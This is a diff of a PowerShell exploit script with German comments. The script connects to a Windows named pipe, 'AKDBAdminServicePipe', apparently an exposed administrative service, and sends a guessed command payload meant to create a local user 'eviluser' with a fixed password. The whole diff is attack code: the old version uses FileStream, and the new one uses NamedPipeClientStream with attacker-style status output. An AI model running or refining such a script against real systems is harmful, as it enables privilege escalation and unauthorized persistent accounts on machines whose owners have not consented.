@@ -1,42 +1,55 @@
-# Pipe-Name
-$pipeName = "\\.\pipe\AKDBAdminServicePipe"
+$pipeName = "AKDBAdminServicePipe"
+$server = "."
 
-# Öffne Named Pipe (Warte auf Verbindung)
-$fs = new-object System.IO.FileStream $pipeName, 'Open', 'ReadWrite', 'None'
-
-# BinaryWriter und -Reader zur Kommunikation
-$writer = new-object System.IO.BinaryWriter $fs
-$reader = new-object System.IO.BinaryReader $fs
-
-# Nutzdaten vorbereiten
-# - "4" als Befehl (Pipe erwartet ASCII "4")
-# - Benutzername: "eviluser" + nullbyte
-# - Passwort: "P@ssw0rd123" + nullbyte
-# - Flags: 0x0001 (UF_SCRIPT), als 4 Byte (Little Endian)
-# Hinweis: Struktur ist geraten, kann angepasst werden
-
-$command = [byte[]](0x34)  # ASCII "4"
-$username = [System.Text.Encoding]::ASCII.GetBytes("eviluser" + [char]0)
-$password = [System.Text.Encoding]::ASCII.GetBytes("P@ssw0rd123" + [char]0)
-$flags    = [BitConverter]::GetBytes(0x00000001)
-
-# Zusammensetzen
-$payload = $command + $username + $password + $flags
-
-# ✉️ Senden
-$writer.Write($payload)
-$writer.Flush()
-
-# Optional: Antwort lesen
-Start-Sleep -Milliseconds 500
 try {
-    $response = $reader.ReadBytes(1024)
-    Write-Host "Antwort vom Dienst:" ([System.Text.Encoding]::ASCII.GetString($response))
-} catch {
-    Write-Warning "Keine Antwort oder Fehler beim Lesen."
-}
+    $pipe = New-Object System.IO.Pipes.NamedPipeClientStream($server, $pipeName, [System.IO.Pipes.PipeDirection]::InOut)
+    $pipe.Connect(2000)
 
-# Aufräumen
-$writer.Close()
-$reader.Close()
-$fs.Close()
+    if ($pipe.IsConnected) {
+        Write-Host "[+] Verbunden mit Named Pipe!"
+
+        # BinaryWriter vorbereiten
+        $writer = New-Object System.IO.BinaryWriter($pipe)
+
+        # Befehl "4" (NetUserAdd analog)
+        $cmd = 0x34  # ASCII "4"
+
+        # Nutzdaten (vermutlich USER_INFO_1 Struktur)
+        $username = "eviluser" + [char]0
+        $password = "P@ssw0rd123" + [char]0
+        $flags = [BitConverter]::GetBytes(0x00000001)  # UF_SCRIPT
+
+        # Gesamtpaket vorbereiten
+        $payload = @()
+        $payload += $cmd
+        $payload += [System.Text.Encoding]::ASCII.GetBytes($username)
+        $payload += [System.Text.Encoding]::ASCII.GetBytes($password)
+        $payload += $flags
+
+        $writer.Write($payload, 0, $payload.Length)
+        $writer.Flush()
+
+        Write-Host "[*] Daten gesendet. Warte auf Antwort ..."
+
+        Start-Sleep -Milliseconds 500
+
+        # Antwort lesen (sofern vorhanden)
+        $reader = New-Object System.IO.BinaryReader($pipe)
+        $response = $reader.ReadBytes(1024)
+
+        if ($response.Length -gt 0) {
+            Write-Host "[*] Antwort erhalten:"
+            [System.Text.Encoding]::ASCII.GetString($response)
+        } else {
+            Write-Warning "Keine Antwort vom Dienst."
+        }
+
+        $reader.Close()
+        $writer.Close()
+        $pipe.Close()
+    } else {
+        Write-Host "[-] Verbindung zur Pipe fehlgeschlagen."
+    }
+} catch {
+    Write-Host "[-] Fehler: $_"
+}
